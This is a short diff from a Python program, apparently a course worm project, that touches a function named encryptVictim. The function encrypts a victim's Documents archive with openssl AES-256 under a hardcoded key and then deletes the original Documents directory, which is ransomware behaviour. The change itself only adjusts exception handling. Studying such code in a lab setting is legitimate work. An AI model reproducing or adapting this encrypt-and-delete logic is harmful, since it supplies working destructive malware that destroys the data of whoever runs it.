@@ -133,9 +133,8 @@ def encryptVictim():
 		call(["chmod", "a+x", "./openssl"])
 		call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents.tar", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
 		shutil.rmtree('/home/ubuntu/Documents/')
-	except e:
+	except:
 		print("Couldn't encypt victim")
-		print e
 
 
 
